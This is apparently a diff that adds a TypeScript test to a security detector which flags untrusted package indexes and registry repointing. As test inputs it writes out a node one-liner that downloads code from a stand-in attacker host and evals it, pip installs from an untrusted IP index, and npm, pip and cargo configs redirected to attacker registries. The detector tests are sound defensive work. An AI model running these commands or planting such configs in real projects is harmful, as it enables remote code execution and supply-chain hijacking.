@@ -53,3 +53,19 @@ test("detectContentCapabilities flags a backdoor baked into file content", () =>
   assert.ok(detectContentCapabilities("node -e \"require('https').get('http://evil.test/p',r=>{let d='';r.on('data',c=>d+=c);r.on('end',()=>eval(d))})\"").length > 0);
   assert.equal(detectContentCapabilities("export const x = 1;").length, 0);
 });
+
+test("every index / package / registry URL is checked, not only the first or last", () => {
+  const cmd = (s: string) => detectCommandCapabilities(resolveCommand(s)).map((c) => c.id);
+  // pip reads --extra-index-url alongside --index-url: an official URL later on the line is no cover.
+  assert.ok(cmd("pip install pkg --extra-index-url http://10.0.0.1/simple --index-url https://pypi.org/simple").includes("untrusted-index"));
+  assert.ok(cmd("pip install http://10.0.0.1/evil-1.0.whl https://files.pythonhosted.org/p/ok-1.0.whl").includes("untrusted-index"));
+  assert.ok(!cmd("pip install pkg --index-url https://pypi.org/simple").includes("untrusted-index"));
+  assert.ok(!cmd("pip install https://files.pythonhosted.org/p/a-1.0.whl https://files.pythonhosted.org/p/b-1.0.whl").includes("untrusted-index"));
+
+  const content = (s: string) => detectContentCapabilities(s).map((c) => c.id);
+  // An official default first does not cover a scoped registry or an extra index.
+  assert.ok(content("registry=https://registry.npmjs.org/\n@acme:registry=https://evil.example/\n").includes("config-repoint"));
+  assert.ok(content("[global]\nindex-url = https://pypi.org/simple\nextra-index-url = http://10.0.0.1/simple\n").includes("config-repoint"));
+  assert.ok(content('[source.crates-io]\nreplace-with = "mirror"\n[source.mirror]\nregistry = "sparse+http://10.0.0.1/index/"\n').includes("config-repoint"));
+  assert.ok(!content("registry=https://registry.npmjs.org/\n@acme:registry=https://registry.npmjs.org/\n").includes("config-repoint"));
+});
